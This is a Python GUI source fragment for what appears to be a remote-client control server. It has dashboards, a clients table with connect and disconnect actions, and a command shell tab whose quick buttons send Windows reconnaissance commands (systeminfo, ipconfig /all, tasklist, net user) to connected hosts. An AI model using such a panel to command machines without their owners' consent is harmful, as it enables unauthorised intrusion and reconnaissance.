        log_container = ctk.CTkFrame(log_frame, fg_color="transparent")
        log_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Use custom scrolled text with improved styling
        self.log_text = scrolledtext.ScrolledText(
            log_container,
            wrap=tk.WORD,
            background=self._adjust_transparency(theme["bg_color"], 0.5),
            foreground=theme["fg_color"],
            borderwidth=0,
            highlightthickness=1,
            highlightbackground=theme["border_color"] if "border_color" in theme else theme["bg_color"],
            font=(FONT_STYLES["monospace"][0], 10),
            padx=10,
            pady=10
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.configure(state="disabled")
        
        # Configure tags for different log levels with modern colors
        self.log_text.tag_configure("info", foreground=theme["fg_color"])
        self.log_text.tag_configure("warning", foreground=theme["warning_color"])
        self.log_text.tag_configure("error", foreground=theme["danger_color"])
        self.log_text.tag_configure("success", foreground=theme["success_color"])
        self.log_text.tag_configure("client", foreground=theme["info_color"])
        
        # Register with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(log_frame)
            self.theme_manager.track_widget(header_frame)
            self.theme_manager.track_widget(header_icon, "label")
            self.theme_manager.track_widget(header_label, "label")
            self.theme_manager.track_widget(controls_frame)
            self.theme_manager.track_widget(log_container)
            self.theme_manager.track_widget(self.log_text, "scrolledtext")

    def setup_right_column(self, parent):
        """Setup the right column with performance metrics and alerts"""
        # Create system performance section
        self.create_performance_section(parent)
        
        # Create recent alerts section
        self.create_alerts_section(parent)

    def create_performance_section(self, parent):
        """Create an enhanced performance metrics section with visual graphs"""
        theme = self.THEMES[self.current_theme]
        
        # Create performance frame with modern styling
        performance_frame = ctk.CTkFrame(
            parent,
            fg_color=theme["card_color"],
            corner_radius=12,
            border_width=0
        )
        performance_frame.pack(fill=tk.X, pady=(0, 15))
        
        # Create header with icon
        header_frame = ctk.CTkFrame(performance_frame, fg_color="transparent")
        header_frame.pack(fill=tk.X, padx=15, pady=(15, 10))
        
        header_icon = ctk.CTkLabel(
            header_frame,
            text="📊",
            font=ctk.CTkFont(size=16),
            text_color=theme["accent_color"],
            width=25
        )
        header_icon.pack(side=tk.LEFT)
        
        header_label = ctk.CTkLabel(
            header_frame,
            text="System Performance",
            font=ctk.CTkFont(size=16, weight="bold"),
            text_color=theme["fg_color"]
        )
        header_label.pack(side=tk.LEFT)
        
        # Create metrics container
        metrics_container = ctk.CTkFrame(performance_frame, fg_color="transparent")
        metrics_container.pack(fill=tk.X, padx=15, pady=(0, 15))
        
        # Enhanced CPU usage with modern styling
        cpu_frame = ctk.CTkFrame(metrics_container, fg_color="transparent")
        cpu_frame.pack(fill=tk.X, pady=5)
        
        cpu_label = ctk.CTkLabel(
            cpu_frame,
            text="CPU Usage",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color=theme["fg_color"],
            width=90,
            anchor="w"
        )
        cpu_label.pack(side=tk.LEFT, padx=5)
        
        self.cpu_value = ctk.CTkLabel(
            cpu_frame,
            text="0%",
            width=40,
            font=ctk.CTkFont(size=12),
            text_color=theme["accent_color"]
        )
        self.cpu_value.pack(side=tk.RIGHT, padx=5)
        
        self.cpu_progress = ctk.CTkProgressBar(
            cpu_frame,
            width=150,
            height=12,
            progress_color=theme["accent_color"],
            fg_color=self._adjust_transparency(theme["bg_color"], 0.5),
            border_width=0,
            corner_radius=6
        )
        self.cpu_progress.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.cpu_progress.set(0)
        
        # Enhanced Memory usage with modern styling
        memory_frame = ctk.CTkFrame(metrics_container, fg_color="transparent")
        memory_frame.pack(fill=tk.X, pady=5)
        
        memory_label = ctk.CTkLabel(
            memory_frame,
            text="Memory Usage",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color=theme["fg_color"],
            width=90,
            anchor="w"
        )
        memory_label.pack(side=tk.LEFT, padx=5)
        
        self.memory_value = ctk.CTkLabel(
            memory_frame,
            text="0%",
            width=40,
            font=ctk.CTkFont(size=12),
            text_color=theme["info_color"]
        )
        self.memory_value.pack(side=tk.RIGHT, padx=5)
        
        self.memory_progress = ctk.CTkProgressBar(
            memory_frame,
            width=150,
            height=12,
            progress_color=theme["info_color"],
            fg_color=self._adjust_transparency(theme["bg_color"], 0.5),
            border_width=0,
            corner_radius=6
        )
        self.memory_progress.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.memory_progress.set(0)
        
        # Enhanced Network usage with modern styling
        network_frame = ctk.CTkFrame(metrics_container, fg_color="transparent")
        network_frame.pack(fill=tk.X, pady=5)
        
        network_label = ctk.CTkLabel(
            network_frame,
            text="Network I/O",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color=theme["fg_color"],
            width=90,
            anchor="w"
        )
        network_label.pack(side=tk.LEFT, padx=5)
        
        self.network_value = ctk.CTkLabel(
            network_frame,
            text="0 KB/s",
            font=ctk.CTkFont(size=12),
            text_color=theme["success_color"]
        )
        self.network_value.pack(side=tk.RIGHT, padx=5)
        
        # Add a mini sparkline for network (placeholder)
        network_sparkline = ctk.CTkProgressBar(
            network_frame,
            width=150,
            height=12,
            progress_color=theme["success_color"],
            fg_color=self._adjust_transparency(theme["bg_color"], 0.5),
            border_width=0,
            corner_radius=6
        )
        network_sparkline.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        network_sparkline.set(0.3)  # Just visual placeholder
        
        # Register with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(performance_frame)
            self.theme_manager.track_widget(header_frame)
            self.theme_manager.track_widget(header_icon, "label")
            self.theme_manager.track_widget(header_label, "label")
            self.theme_manager.track_widget(metrics_container)
            
            self.theme_manager.track_widget(cpu_frame)
            self.theme_manager.track_widget(cpu_label, "label")
            self.theme_manager.track_widget(self.cpu_value, "label")
            self.theme_manager.track_widget(self.cpu_progress)
            
            self.theme_manager.track_widget(memory_frame)
            self.theme_manager.track_widget(memory_label, "label")
            self.theme_manager.track_widget(self.memory_value, "label")
            self.theme_manager.track_widget(self.memory_progress)
            
            self.theme_manager.track_widget(network_frame)
            self.theme_manager.track_widget(network_label, "label")
            self.theme_manager.track_widget(self.network_value, "label")
            self.theme_manager.track_widget(network_sparkline)


    def create_alerts_section(self, parent):
        """Create modern alerts section with enhanced styling"""
        theme = self.THEMES[self.current_theme]
        
        # Create alerts frame with modern styling
        alerts_frame = ctk.CTkFrame(
            parent,
            fg_color=theme["card_color"],
            corner_radius=12,
            border_width=0
        )
        alerts_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create header with icon
        header_frame = ctk.CTkFrame(alerts_frame, fg_color="transparent")
        header_frame.pack(fill=tk.X, padx=15, pady=(15, 10))
        
        header_icon = ctk.CTkLabel(
            header_frame,
            text="🔔",
            font=ctk.CTkFont(size=16),
            text_color=theme["accent_color"],
            width=25
        )
        header_icon.pack(side=tk.LEFT)
        
        header_label = ctk.CTkLabel(
            header_frame,
            text="Recent Alerts",
            font=ctk.CTkFont(size=16, weight="bold"),
            text_color=theme["fg_color"]
        )
        header_label.pack(side=tk.LEFT)
        
        # Create alerts container
        alerts_container = ctk.CTkFrame(alerts_frame, fg_color="transparent")
        alerts_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        # Create a custom alerts display instead of a basic listbox
        self.alerts_list_frame = ctk.CTkScrollableFrame(
            alerts_container,
            fg_color=self._adjust_transparency(theme["bg_color"], 0.5),
            corner_radius=6,
            border_width=0
        )
        self.alerts_list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Initialize with empty alerts list
        self.alerts_items = []
        
        # Add initial message
        self.add_styled_alert("Server ready - No active alerts", "info")
        
        # Register with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(alerts_frame)
            self.theme_manager.track_widget(header_frame)
            self.theme_manager.track_widget(header_icon, "label")
            self.theme_manager.track_widget(header_label, "label")
            self.theme_manager.track_widget(alerts_container)
            self.theme_manager.track_widget(self.alerts_list_frame)

    def add_alert(self, message):
        """Override the original add_alert method with our styled version"""
        # Detect alert type based on message content
        if "Error" in message or "Failed" in message or "failed" in message:
            alert_type = "error"
        elif "Warning" in message or "disconnect" in message or "Disconnect" in message:
            alert_type = "warning"
        elif "success" in message or "Success" in message or "connected" in message or "Connected" in message:
            alert_type = "success"
        elif "client" in message or "Client" in message:
            alert_type = "client"
        else:
            alert_type = "info"
        
        # Add to alerts display
        self.add_styled_alert(message, alert_type)
        
        # Maintain original alerts box if it exists (for compatibility)
        if hasattr(self, 'alerts_box') and isinstance(self.alerts_box, tk.Listbox):
            timestamp = time.strftime("%H:%M:%S", time.localtime())
            alert_text = f"[{timestamp}] {message}"
            
            # Add new alert at the top
            self.alerts_box.insert(0, alert_text)
            
            # Keep only the 5 most recent alerts
            if self.alerts_box.size() > 5:
                self.alerts_box.delete(5, tk.END)

    def add_styled_alert(self, message, alert_type="info"):
        """Add a stylized alert to the alerts display"""
        theme = self.THEMES[self.current_theme]
        
        # Maximum alerts to display
        max_alerts = 5
        
        # Get timestamp
        timestamp = time.strftime("%H:%M:%S", time.localtime())
        
        # Get icon and color based on alert type
        icons = {
            "info": "ℹ️",
            "warning": "⚠️",
            "error": "❌",
            "success": "✅",
            "client": "👤"
        }
        
        colors = {
            "info": theme["fg_color"],
            "warning": theme["warning_color"],
            "error": theme["danger_color"],
            "success": theme["success_color"],
            "client": theme["info_color"]
        }
        
        # Create alert item frame
        alert_frame = ctk.CTkFrame(
            self.alerts_list_frame,
            fg_color=self._adjust_transparency(theme["card_color"], 0.7),
            corner_radius=6,
            height=36
        )
        alert_frame.pack(fill=tk.X, pady=4, padx=2)
        alert_frame.pack_propagate(False)  # Keep fixed height
        
        # Add icon
        icon_label = ctk.CTkLabel(
            alert_frame,
            text=icons.get(alert_type, "ℹ️"),
            font=ctk.CTkFont(size=16),
            width=25,
            text_color=colors.get(alert_type, theme["fg_color"])
        )
        icon_label.pack(side=tk.LEFT, padx=(8, 2))
        
        # Add message
        message_label = ctk.CTkLabel(
            alert_frame,
            text=message,
            font=ctk.CTkFont(size=11),
            text_color=theme["fg_color"],
            anchor="w",
            justify="left"
        )
        message_label.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        # Add timestamp
        time_label = ctk.CTkLabel(
            alert_frame,
            text=timestamp,
            font=ctk.CTkFont(size=10),
            text_color=self._adjust_transparency(theme["fg_color"], 0.7),
            width=50
        )
        time_label.pack(side=tk.RIGHT, padx=(2, 8))
        
        # Store alert data
        alert_data = {
            'frame': alert_frame,
            'icon': icon_label,
            'message': message_label,
            'time': time_label,
            'type': alert_type,
            'timestamp': time.time()
        }
        
        # Add to alerts list
        self.alerts_items.insert(0, alert_data)
        
        # Limit to max alerts
        if len(self.alerts_items) > max_alerts:
            # Remove oldest alert
            old_alert = self.alerts_items.pop()
            if old_alert and 'frame' in old_alert:
                old_alert['frame'].destroy()
        
        # Register with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(alert_frame)
            self.theme_manager.track_widget(icon_label, "label")
            self.theme_manager.track_widget(message_label, "label")
            self.theme_manager.track_widget(time_label, "label")

    def update_dashboard_theme(self):
        """Update dashboard elements to match the current theme"""
        if not hasattr(self, 'THEMES') or not hasattr(self, 'current_theme'):
            return
        
        theme = self.THEMES[self.current_theme]
        
        # Update performance metrics
        self.update_performance_metrics_theme(theme)
        
        # Update text elements and logs
        self.update_text_elements_theme(theme)
        
        # Update client map
        self.update_client_map_theme(theme)
        
        # Update alerts
        self.update_alerts_theme(theme)
        
        # Update summary cards
        self.update_summary_cards_theme(theme)

    def update_performance_metrics_theme(self, theme):
        """Update performance metrics elements with theme colors"""
        # CPU progress bar
        if hasattr(self, 'cpu_progress'):
            self.cpu_progress.configure(
                progress_color=theme["accent_color"],
                fg_color=self._adjust_transparency(theme["bg_color"], 0.5),
                border_width=0,
                corner_radius=6
            )
        
        # Memory progress bar
        if hasattr(self, 'memory_progress'):
            self.memory_progress.configure(
                progress_color=theme["info_color"],
                fg_color=self._adjust_transparency(theme["bg_color"], 0.5),
                border_width=0,
                corner_radius=6
            )
        
        # CPU and memory value labels
        if hasattr(self, 'cpu_value'):
            self.cpu_value.configure(text_color=theme["accent_color"])
        
        if hasattr(self, 'memory_value'):
            self.memory_value.configure(text_color=theme["info_color"])
        
        if hasattr(self, 'network_value'):
            self.network_value.configure(text_color=theme["success_color"])

    def update_text_elements_theme(self, theme):
        """Update text display elements with theme colors"""
        # Log text
        if hasattr(self, 'log_text'):
            self.log_text.configure(
                background=self._adjust_transparency(theme["bg_color"], 0.5),
                foreground=theme["fg_color"]
            )
            # Update log tags
            self.log_text.tag_configure("info", foreground=theme["fg_color"])
            self.log_text.tag_configure("warning", foreground=theme["warning_color"])
            self.log_text.tag_configure("error", foreground=theme["danger_color"])
            self.log_text.tag_configure("success", foreground=theme["success_color"])
            self.log_text.tag_configure("client", foreground=theme["info_color"])
        
        # Server status indicator in header
        if hasattr(self, 'server_status_light') and hasattr(self, 'server_status_label'):
            is_online = self.server_status_label.cget("text") == "Server Online"
            self.server_status_light.configure(
                text_color=theme["success_color"] if is_online else theme["danger_color"]
            )

    def update_client_map_theme(self, theme):
        """Update client map with theme colors"""
        if hasattr(self, 'mini_map_frame') and isinstance(self.mini_map_frame, ctk.CTkCanvas):
            self.mini_map_frame.configure(
                bg=self._adjust_transparency(theme["bg_color"], 0.5)
            )
            
            # Redraw the map elements
            self.mini_map_frame.delete("all")
            self.draw_world_map()
            
            # Re-add the client dots
            if hasattr(self, 'client_dots'):
                for client in self.client_dots:
                    x, y = client['location']
                    client_id = client['id']
                    
                    # Recreate main dot
                    dot = self.mini_map_frame.create_oval(
                        x-6, y-6, x+6, y+6,
                        fill=theme["accent_color"],
                        outline=theme["fg_color"],
                        width=1,
                        tags=f"client_{client_id}"
                    )
                    
                    # Recreate pulse
                    pulse = self.mini_map_frame.create_oval(
                        x-12, y-12, x+12, y+12,
                        fill="",
                        outline=self._adjust_transparency(theme["accent_color"], 0.5),
                        width=1,
                        tags=f"pulse_{client_id}"
                    )
                    
                    # Update client data
                    client['dot'] = dot
                    client['pulse'] = pulse
                    
                    # Restart animation
                    self.animate_client_dot(client)

    def update_alerts_theme(self, theme):
        """Update alerts display with theme colors"""
        # Update old alerts box if it exists
        if hasattr(self, 'alerts_box') and isinstance(self.alerts_box, tk.Listbox):
            self.alerts_box.configure(
                bg=self._adjust_transparency(theme["bg_color"], 0.5),
                fg=theme["fg_color"],
                selectbackground=theme["accent_color"],
                selectforeground="#FFFFFF"  # White text for selected items
            )
        
        # Update new styled alerts
        if hasattr(self, 'alerts_list_frame'):
            self.alerts_list_frame.configure(
                fg_color=self._adjust_transparency(theme["bg_color"], 0.5)
            )
            
            # Update individual alert items
            if hasattr(self, 'alerts_items'):
                for alert in self.alerts_items:
                    if 'frame' in alert:
                        alert['frame'].configure(
                            fg_color=self._adjust_transparency(theme["card_color"], 0.7)
                        )
                    
                    if 'icon' in alert and 'type' in alert:
                        colors = {
                            "info": theme["fg_color"],
                            "warning": theme["warning_color"],
                            "error": theme["danger_color"],
                            "success": theme["success_color"],
                            "client": theme["info_color"]
                        }
                        alert['icon'].configure(
                            text_color=colors.get(alert['type'], theme["fg_color"])
                        )
                    
                    if 'message' in alert:
                        alert['message'].configure(text_color=theme["fg_color"])
                    
                    if 'time' in alert:
                        alert['time'].configure(
                            text_color=self._adjust_transparency(theme["fg_color"], 0.7)
                        )

    def update_summary_cards_theme(self, theme):
        """Update summary cards with theme colors"""
        if hasattr(self, 'summary_cards'):
            for card_key, card in self.summary_cards.items():
                # Determine accent color based on card type
                if card_key == 'clients':
                    accent_color = theme["info_color"]
                elif card_key == 'uptime':
                    accent_color = theme["success_color"]
                elif card_key == 'cpu':
                    accent_color = theme["accent_color"]
                else:
                    accent_color = theme["accent_color"]
                
                # Update icon color
                if hasattr(card, 'icon_label'):
                    card.icon_label.configure(text_color=accent_color)
                
                # Update title label
                if hasattr(card, 'title_label'):
                    card.title_label.configure(text_color=theme["fg_color"])
                
                # Update value label
                if hasattr(card, 'value_label'):
                    card.value_label.configure(text_color=theme["fg_color"])
                
                # Store accent color for future reference
                card.accent_color = accent_color

    def update_dashboard_buttons(self):
        """Update all dashboard buttons to match the current theme"""
        if hasattr(self, 'action_buttons') and hasattr(self, 'current_theme'):
            theme = self.THEMES[self.current_theme]
            
            for btn in self.action_buttons:
                # Default is regular button styling with modern look
                btn.configure(
                    fg_color=theme["card_color"],
                    hover_color=self._lighten_color(theme["card_color"]) if "Dark" in self.current_theme else self._darken_color(theme["card_color"]),
                    text_color=theme["fg_color"],
                    border_width=1,
                    border_color=theme["border_color"] if "border_color" in theme else self._lighten_color(theme["card_color"]),
                    corner_radius=8
                )
                
                # Update icon color if the button has an icon label
                if hasattr(btn, 'icon_label'):
                    btn.icon_label.configure(text_color=theme["accent_color"])

    def _lighten_color(self, hex_color, amount=0.1):
        """Lighten a hex color by the specified amount"""
        import colorsys
        
        # Convert hex to RGB
        hex_color = hex_color.lstrip('#')
        r, g, b = tuple(int(hex_color[i:i+2], 16) / 255 for i in (0, 2, 4))
        
        # Convert RGB to HSV
        h, s, v = colorsys.rgb_to_hsv(r, g, b)
        
        # Increase brightness (value)
        v = min(1.0, v + amount)
        
        # Convert back to RGB
        r, g, b = colorsys.hsv_to_rgb(h, s, v)
        
        # Convert back to hex
        return f"#{int(r*255):02x}{int(g*255):02x}{int(b*255):02x}"

    def _darken_color(self, hex_color, amount=0.1):
        """Darken a hex color by the specified amount"""
        import colorsys
        
        # Convert hex to RGB
        hex_color = hex_color.lstrip('#')
        r, g, b = tuple(int(hex_color[i:i+2], 16) / 255 for i in (0, 2, 4))
        
        # Convert RGB to HSV
        h, s, v = colorsys.rgb_to_hsv(r, g, b)
        
        # Decrease brightness (value)
        v = max(0.0, v - amount)
        
        # Convert back to RGB
        r, g, b = colorsys.hsv_to_rgb(h, s, v)
        
        # Convert back to hex
        return f"#{int(r*255):02x}{int(g*255):02x}{int(b*255):02x}"

    def _adjust_transparency(self, hex_color, alpha=0.5):
        """Adjust the transparency of a color for a glass-like effect"""
        # Get the theme
        theme = self.THEMES[self.current_theme]
        
        # Determine a suitable background color to blend with
        bg_color = theme["bg_color"]
        
        # Convert hex to RGB
        hex_color = hex_color.lstrip('#')
        r1, g1, b1 = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        
        bg_color = bg_color.lstrip('#')
        r2, g2, b2 = tuple(int(bg_color[i:i+2], 16) for i in (0, 2, 4))
        
        # Blend the colors based on alpha
        r = int(r1 * alpha + r2 * (1 - alpha))
        g = int(g1 * alpha + g2 * (1 - alpha))
        b = int(b1 * alpha + b2 * (1 - alpha))
        
        # Convert back to hex
        return f"#{r:02x}{g:02x}{b:02x}"
        


    def load_icon_placeholder(self, icon_name):
        """
        Create a placeholder for icons until proper icons are implemented
        In a production environment, replace this with actual icon loading
        """
        # Will return None to indicate no icon
        # This can be replaced with actual icon loading code when available
        return None
    
    
    def clear_activity_log(self):
        """Clear the activity log"""
        self.log_text.configure(state="normal")
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state="disabled")
        self.add_alert("Activity log cleared")
        
    def save_activity_log(self):
        """Save activity log to a file"""
        try:
            file_path = filedialog.asksaveasfilename(
                defaultextension=".log",
                filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")],
                title="Save Activity Log"
            )
            
            if file_path:
                log_content = self.log_text.get(1.0, tk.END)
                with open(file_path, 'w') as f:
                    f.write(log_content)
                self.log(f"Activity log saved to {file_path}", log_type="success")
                self.add_alert(f"Log saved to {os.path.basename(file_path)}")
        except Exception as e:
            self.log(f"Error saving log: {e}", log_type="error")
            
    def setup_clients_tab(self):
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Store clients buttons for theme updates
        self.clients_buttons = []
        
        # Create toolbar with brutalist styling
        toolbar_frame = ctk.CTkFrame(self.clients_frame, 
                                   fg_color=theme["card_color"],
                                   corner_radius=0,  # Square corners
                                   border_color=theme["border_color"] if "border_color" in theme else None,
                                   border_width=1 if "border_color" in theme else 0)
        toolbar_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client list header
        client_header = ctk.CTkLabel(toolbar_frame, text="CLIENTS LIST",  # All caps
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]),
                                  text_color=theme["fg_color"])
        client_header.pack(side=tk.LEFT, padx=15, pady=5, anchor="w")
        
        refresh_btn = ctk.CTkButton(toolbar_frame, text="REFRESH",  # All caps
                                command=self.refresh_clients,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                text_color=theme["fg_color"],
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0,
                                corner_radius=0,  # Square corners
                                height=30)  # Taller button
        refresh_btn.pack(side=tk.RIGHT, padx=5, pady=5)
        self.clients_buttons.append(refresh_btn)
        
        # Create clients table frame with brutalist styling
        table_frame = ctk.CTkFrame(self.clients_frame, 
                                fg_color=theme["card_color"],
                                corner_radius=0,  # Square corners
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0)
        table_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Configure treeview style first before creating the treeview with brutalist styling
        style = ttk.Style()
        style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=1,
                        relief="flat",
                        highlightthickness=0)
        
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])  # Black text on selection for contrast
        
        # Create treeview for clients with the Custom style
        columns = ("ID", "IP", "PORT", "HOSTNAME", "STATUS")  # All caps column headers
        self.clients_tree = ttk.Treeview(table_frame, columns=columns, show="headings", 
                                    style="Custom.Treeview")
        # Define headings
        for col in columns:
            self.clients_tree.heading(col, text=col)
            self.clients_tree.column(col, width=100)
        
        # Configure treeview to use theme colors with brutalist styling
        style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        font=FONT_STYLES["normal"],
                        rowheight=28)  # Taller rows
        
        style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground=theme["fg_color"],  # Use theme text color
                        font=("Segoe UI", 10, "bold"),
                        relief="flat")
        
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
        
        # Add scrollbar with brutalist styling
        scrollbar = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, 
                                command=self.clients_tree.yview,
                                style="Custom.Vertical.TScrollbar")
        self.clients_tree.configure(yscroll=scrollbar.set)
        
        # Configure scrollbar style with brutalist elements
        style.configure("Custom.Vertical.TScrollbar", 
                        background=theme["button_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["accent_color"])  # Use accent color for arrows
        
        # Pack components
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Create client action buttons with brutalist styling
        action_frame = ctk.CTkFrame(self.clients_frame, 
                                 fg_color=theme["card_color"],
                                 corner_radius=0,  # Square corners
                                 border_color=theme["border_color"] if "border_color" in theme else None,
                                 border_width=1 if "border_color" in theme else 0)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        connect_btn = ctk.CTkButton(action_frame, text="CONNECT",  # All caps
                                  command=self.connect_to_client,
                                  fg_color=theme["success_color"],  # Use success color for connect
                                  hover_color=theme["hover_color"],
                                  text_color="#000000",  # Black text for contrast on colored button
                                  border_color=theme["border_color"] if "border_color" in theme else None,
                                  border_width=1 if "border_color" in theme else 0,
                                  corner_radius=0,  # Square corners
                                  height=30)  # Taller button
        connect_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.clients_buttons.append(connect_btn)
        
        disconnect_btn = ctk.CTkButton(action_frame, text="DISCONNECT",  # All caps
                                     command=self.disconnect_client,
                                     fg_color=theme["danger_color"],
                                     hover_color=theme["hover_color"],
                                     text_color="#000000",  # Black text for contrast on colored button
                                     border_color=theme["border_color"] if "border_color" in theme else None,
                                     border_width=1 if "border_color" in theme else 0,
                                     corner_radius=0,  # Square corners
                                     height=30)  # Taller button
        disconnect_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.clients_buttons.append(disconnect_btn)
        
        # Add View Details button
        details_btn = ctk.CTkButton(action_frame, text="VIEW DETAILS",  # All caps
                                 command=self.view_client_details,
                                 fg_color=theme["button_color"],
                                 hover_color=theme["hover_color"],
                                 text_color=theme["fg_color"],
                                 border_color=theme["border_color"] if "border_color" in theme else None,
                                 border_width=1 if "border_color" in theme else 0,
                                 corner_radius=0,  # Square corners
                                 height=30)  # Taller button
        details_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.clients_buttons.append(details_btn)
        
        # Right-click menu for clients with brutalist styling
        self.client_menu = tk.Menu(self.root, tearoff=0, 
                                 bg=theme["card_color"],
                                 fg=theme["fg_color"],
                                 activebackground=theme["accent_color"],
                                 activeforeground="#000000")  # Black text on accent for contrast
        self.client_menu.add_command(label="CONNECT", command=self.connect_to_client)  # All caps
        self.client_menu.add_command(label="DISCONNECT", command=self.disconnect_client)  # All caps
        self.client_menu.add_separator()
        self.client_menu.add_command(label="VIEW DETAILS", command=self.view_client_details)  # All caps
        
        # Bind events
        self.clients_tree.bind("<Button-3>", self.show_client_menu)
        self.clients_tree.bind("<Double-1>", lambda e: self.connect_to_client())
        
        # Track widgets with theme manager
        if hasattr(self, 'theme_manager'):
            # Track frames
            self.theme_manager.track_widget(toolbar_frame)
            self.theme_manager.track_widget(table_frame)
            self.theme_manager.track_widget(action_frame)
            
            # Track header
            self.theme_manager.track_widget(client_header, "label")
            
            # Track treeview
            self.theme_manager.track_widget(self.clients_tree, "treeview")
            
            # Track buttons
            for btn in self.clients_buttons:
                self.theme_manager.track_widget(btn)
            
            # Track context menu
            self.theme_manager.track_widget(self.client_menu, "menu")

    def update_clients_buttons(self):
        """Update all clients tab buttons to match the current theme"""
        if hasattr(self, 'clients_buttons') and hasattr(self, 'current_theme'):
            theme = self.THEMES[self.current_theme]
            
            for btn in self.clients_buttons:
                # Check button text to determine type
                btn_text = btn.cget("text")
                
                if btn_text == "CONNECT":
                    # Connect button uses success color
                    btn.configure(
                        fg_color=theme["success_color"],
                        hover_color=theme["hover_color"],
                        text_color="#000000",  # Black text for contrast
                        border_color=theme["border_color"] if "border_color" in theme else None,
                        border_width=1 if "border_color" in theme else 0,
                        corner_radius=0
                    )
                elif btn_text == "DISCONNECT":
                    # Disconnect button uses danger color
                    btn.configure(
                        fg_color=theme["danger_color"],
                        hover_color=theme["hover_color"],
                        text_color="#000000",  # Black text for contrast
                        border_color=theme["border_color"] if "border_color" in theme else None,
                        border_width=1 if "border_color" in theme else 0,
                        corner_radius=0
                    )
                else:
                    # Regular button styling
                    btn.configure(
                        fg_color=theme["button_color"],
                        hover_color=theme["hover_color"],
                        text_color=theme["fg_color"],
                        border_color=theme["border_color"] if "border_color" in theme else None,
                        border_width=1 if "border_color" in theme else 0,
                        corner_radius=0
                    )
        
        # Update client menu
        if hasattr(self, 'client_menu'):
            self.client_menu.configure(
                bg=theme["card_color"],
                fg=theme["fg_color"],
                activebackground=theme["accent_color"],
                activeforeground="#000000"  # Black text on accent for contrast
            )
        
    def setup_command_tab(self):
        """Set up an enhanced command shell tab with additional features"""
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create top info frame with improved layout
        info_frame = ctk.CTkFrame(self.command_frame, 
                                fg_color=theme["card_color"],
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0)
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Connected client info with more details
        client_info_frame = ctk.CTkFrame(info_frame, fg_color="transparent")
        client_info_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        client_label = ctk.CTkLabel(client_info_frame, text="Connected Client:", 
                                font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                size=FONT_STYLES["normal"][1], 
                                                weight="bold"),
                                text_color=theme["fg_color"])
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.connected_client_label = ctk.CTkLabel(client_info_frame, text="None", 
                                               text_color=theme["fg_color"])
        self.connected_client_label.pack(side=tk.LEFT, padx=5)
        
        # Add client OS info label
        self.client_os_label = ctk.CTkLabel(client_info_frame, text="", 
                                        text_color=theme["fg_color"])
        self.client_os_label.pack(side=tk.LEFT, padx=(20, 5))
        
        # Add connection status indicator with more vivid colors
        self.connection_status_indicator = ctk.CTkLabel(info_frame, text="●", text_color=theme["danger_color"], 
                                                    font=ctk.CTkFont(size=24))  # Larger indicator
        self.connection_status_indicator.pack(side=tk.RIGHT, padx=10)
        
        # Command buttons for quick actions with improved styling
        cmd_buttons_frame = ctk.CTkFrame(self.command_frame, 
                                     fg_color=theme["card_color"],
                                     border_color=theme["border_color"] if "border_color" in theme else None,
                                     border_width=1 if "border_color" in theme else 0)
        cmd_buttons_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Store buttons in a list for theme updates
        self.command_buttons = []
        self.btn_status = None
        
        # Common command buttons with improved styling
        common_commands = [
            ("System Info", "systeminfo"),
            ("Network Info", "ipconfig /all"),
            ("Processes", "tasklist"),
            ("Users", "net user"),
            ("Clear", self.clear_terminal)
        ]
        
        for label, cmd in common_commands:
            if callable(cmd):
                btn = ctk.CTkButton(cmd_buttons_frame, text=label, 
                                command=cmd,
                                fg_color=theme["button_color"],
